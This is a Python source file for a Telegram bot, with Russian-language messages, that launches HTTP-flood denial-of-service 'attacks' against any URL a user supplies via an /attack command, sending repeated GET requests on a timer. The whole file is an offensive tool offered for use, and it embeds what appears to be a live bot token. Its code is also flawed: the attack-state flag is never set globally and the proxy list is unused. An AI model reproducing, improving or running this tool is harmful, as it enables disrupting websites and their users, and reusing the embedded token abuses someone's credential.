from telegram.ext import Updater, CommandHandler
import requests

bot_token = '6696438979:AAFQ22gFgWMT-eoVda-a_EZBfE_zkOBCMB0' # Замените на ваш токен бота

attack_interval = None
is_attack_started = False
proxies = []

def start_command(update, context):
    chat_id = update.message.chat_id
    message = '''
    Бот by HighNet @fyuman_net

    Введите /stop, чтобы остановить атаку.

    Чтобы начать атаку, используйте следующую команду:
    /attack <url> <time> <req_per_ip> <threads>

    Пример:
    /attack http://example.com 135 65 5
    '''
    context.bot.send_message(chat_id=chat_id, text=message)

def attack_command(update, context):
    chat_id = update.message.chat_id
    command_params = context.args

    if len(command_params) != 4:
        message = 'Неверная команда! Пожалуйста, укажите требуемые параметры: URL, время, req_per_ip и threads.'
        context.bot.send_message(chat_id=chat_id, text=message)
        return

    if is_attack_started:
        message = 'Атака уже запущена!'
        context.bot.send_message(chat_id=chat_id, text=message)
        return

    target = command_params[0]
    time = int(command_params[1])
    req_per_ip = int(command_params[2])
    threads = int(command_params[3])

    global attack_interval
    attack_interval = context.job_queue.run_repeating(send_req, interval=1, first=0, context=(target, time, req_per_ip, threads))
    is_attack_started = True

    success_message = f'Атака успешно запущена на {target} в течение {time} секунд с {threads} потоками и {req_per_ip} запросов на IP.'
    context.bot.send_message(chat_id=chat_id, text=success_message)

    context.job_queue.run_once(stop_attack, time, context=chat_id)

def stop_command(update, context):
    chat_id = update.message.chat_id
    context.job_queue.stop()
    is_attack_started = False
    message = 'Атака остановлена.'
    context.bot.send_message(chat_id=chat_id, text=message)

def send_req(context):
    target, time, req_per_ip, threads = context.job.context
    for i in range(threads):
        for j in range(req_per_ip):
            response = requests.get(target)
            print(response.text)

def main():
    updater = Updater(token=bot_token, use_context=True)
    dispatcher = updater.dispatcher

    start_handler = CommandHandler('start', start_command)
    attack_handler = CommandHandler('attack', attack_command)
    stop_handler = CommandHandler('stop', stop_command)

    dispatcher.add_handler(start_handler)
    dispatcher.add_handler(attack_handler)
    dispatcher.add_handler(stop_handler)

    updater.start_polling()
    updater.idle()

if __name__ == '__main__':
    main()
